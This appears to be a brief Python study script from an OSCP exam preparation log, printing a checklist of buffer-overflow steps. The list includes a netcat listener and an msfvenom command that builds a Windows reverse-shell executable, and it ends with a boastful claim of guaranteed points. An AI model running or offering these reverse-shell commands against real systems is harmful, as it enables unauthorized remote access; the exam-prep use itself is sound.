
#!/usr/bin/env python3
"""
Buffer Overflow Framework - Dag 050 #15/25
OSCP exam buffer overflow pipeline
"""
print("🔥 BUFFER OVERFLOW OSCP LIVE - Dag 050 #15!")
print("🎯 OSCP exam BOF pipeline:")

bof_steps = [
    "nc -nlvp 4444",                    # Listener
    "./searchsploit ProFTPD 1.3.5",     # Vuln version
    "pattern_create.rb -l 2000",        # Pattern gen
    "pattern_offset.rb 0x35724134",     # Offset find
    "cyclic(140)",                      # Python offset
    "./exploit -b 4 -f",                # Bad chars
    "msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe"
]

for step in bof_steps:
    print(f"🏃 {step}")

print("✅ Dag 050 Buffer Overflow #15 READY!")
print("💥 OSCP BOF = 60pts guaranteed!")
